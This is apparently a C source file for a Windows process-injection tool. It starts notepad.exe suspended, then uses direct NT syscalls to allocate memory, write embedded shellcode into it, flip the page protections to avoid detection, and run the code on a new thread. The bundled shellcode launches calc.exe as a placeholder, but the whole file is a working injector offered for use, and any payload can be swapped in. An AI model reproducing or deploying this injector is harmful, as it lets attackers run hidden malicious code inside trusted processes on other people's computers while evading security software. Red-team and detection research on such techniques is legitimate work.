/*
    Author: 0x42en
    License: BSD 3-Clause

    This file require mingw compiler to be installed
        apt install mingw-w64

    Compile it on linux using:
        x86_64-w64-mingw32-gcc -Wall -s -static -masm=intel inject.c -o inject.exe
*/

#include <windows.h>

// Ensure syscall.h is generated next to this file
#include "syscall.h"

// shellcode generated with ShellSnip (launch calc.exe)
unsigned char shellcode[] = {0x48,0x31,0xff,0x48,0xf7,0xe7,0x65,0x48,0x8b,0x58,
    0x60,0x48,0x8b,0x5b,0x18,0x48,0x8b,0x5b,0x20,0x48,0x8b,0x1b,0x48,0x8b,0x1b,
    0x48,0x8b,0x5b,0x20,0x49,0x89,0xd8,0x8b,0x5b,0x3c,0x4c,0x01,0xc3,0x48,0x31,
    0xc9,0x66,0x81,0xc1,0xff,0x88,0x48,0xc1,0xe9,0x08,0x8b,0x14,0x0b,0x4c,0x01,
    0xc2,0x4d,0x31,0xd2,0x44,0x8b,0x52,0x1c,0x4d,0x01,0xc2,0x4d,0x31,0xdb,0x44,
    0x8b,0x5a,0x20,0x4d,0x01,0xc3,0x4d,0x31,0xe4,0x44,0x8b,0x62,0x24,0x4d,0x01,
    0xc4,0xeb,0x32,0x5b,0x59,0x48,0x31,0xc0,0x48,0x89,0xe2,0x51,0x48,0x8b,0x0c,
    0x24,0x48,0x31,0xff,0x41,0x8b,0x3c,0x83,0x4c,0x01,0xc7,0x48,0x89,0xd6,0xf3,
    0xa6,0x74,0x05,0x48,0xff,0xc0,0xeb,0xe6,0x59,0x66,0x41,0x8b,0x04,0x44,0x41,
    0x8b,0x04,0x82,0x4c,0x01,0xc0,0x53,0xc3,0x48,0x31,0xc9,0x80,0xc1,0x07,0x48,
    0xb8,0xff,0xa8,0x96,0x91,0xba,0x87,0x9a,0x9c,0x48,0xc1,0xe8,0x08,0x48,0xf7,
    0xd0,0x50,0x51,0xe8,0xb0,0xff,0xff,0xff,0x49,0x89,0xc6,0x48,0x31,0xc0,0x50,
    0x48,0xb8,0x9c,0x9e,0x93,0x9c,0xd1,0x9a,0x87,0x9a,0x48,0xf7,0xd0,0x50,0x48,
    0x31,0xd2,0x48,0xff,0xc2,0x48,0x89,0xe1,0x48,0x83,0xec,0x20,0x41,0xff,0xd6,
    0x48,0x83,0xc4,0x20,0xc3};

int execute(const char *name) {
    DWORD op;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    LPVOID rPtr = NULL;
	HANDLE pHandle;
    HANDLE tHandle;
    SIZE_T shellLen = sizeof(shellcode);
	STARTUPINFOA si = {sizeof(STARTUPINFO)};
    PROCESS_INFORMATION pi = {0};
    
    // Create sacrificial process
    CreateProcessA(name, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    // Wait until creation
    WaitForSingleObject(pi.hProcess, 1000);
	
    // Generate Object
    InitializeObjectAttributes(&oa, NULL, 0, 0, NULL);
	cid.UniqueProcess = (HANDLE)((UINT_PTR)pi.dwProcessId);
    cid.UniqueThread = NULL;

	// Open sacrificial process
	NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &oa, &cid);

	// Allocate memory page to sacrifical process
	NtAllocateVirtualMemory(
        pHandle,
        &rPtr,
        0,
        &shellLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

	// Write shellcode to memory page
	NtWriteVirtualMemory(pHandle, rPtr, &shellcode, shellLen, 0);
    // Change back memory page permissions
    NtProtectVirtualMemory(pHandle, rPtr, &shellLen, PAGE_NOACCESS, &op);

	// Create main thread of sacrificial process
	NtCreateThreadEx(
        &tHandle,
        THREAD_ALL_ACCESS,
        NULL,
        pHandle,
        (LPTHREAD_START_ROUTINE)rPtr,
        NULL, FALSE, 0, 0, 0, NULL);
    // Protect memory page with Execute permission
    NtProtectVirtualMemory(pHandle, rPtr, &shellLen, PAGE_EXECUTE, &op);
    // Start main Thread
    ResumeThread(tHandle);

	// Close handles
    CloseHandle(tHandle);
	CloseHandle(pHandle);

    return 0;
}

int main(int argc, char* argv[]) {
    // You might want to change sacrificial process name
    const char* name = "C:\\Windows\\System32\\notepad.exe";
    execute(name);

	return 0;
}
